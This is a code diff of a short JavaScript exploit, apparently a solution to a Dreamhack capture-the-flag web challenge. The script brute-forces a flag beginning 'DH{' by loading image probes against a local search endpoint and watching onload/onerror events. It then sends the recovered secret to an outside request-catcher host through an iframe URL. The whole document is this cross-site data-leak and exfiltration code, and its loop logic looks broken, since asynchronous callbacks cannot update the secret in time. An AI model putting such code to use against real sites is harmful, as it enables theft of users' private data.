@@ -1,18 +1,19 @@
 <iframe id="iframe"></iframe>
+<img id="img"></img>
 <script>
     let str = "0123456789abcdef";
-    let a = document.createElement('script');
+    let a = document.getElementById("img");
     let secret = 'DH{';
     for (let j = 0; j < 32; j++){
         for(let i of str){
             let qu = secret + i;
-            a.src=`<img src='http://127.0.0.1:8000/search?keyword=${qu}'>`;
+            a.src=`http://127.0.0.1:8000/search?keyword=${qu}`;
             a.onload=()=>{
                 secret = secret + i;
                 console.log('200');};
             a.onerror=()=>{console.log('404');};
         }
     }
-    iframe.src = `https://qwymbik.request.dreamhack.games/${secret}`;
+    iframe.src = `https://dlmrwca.request.dreamhack.games/${secret}`;
     
 </script>
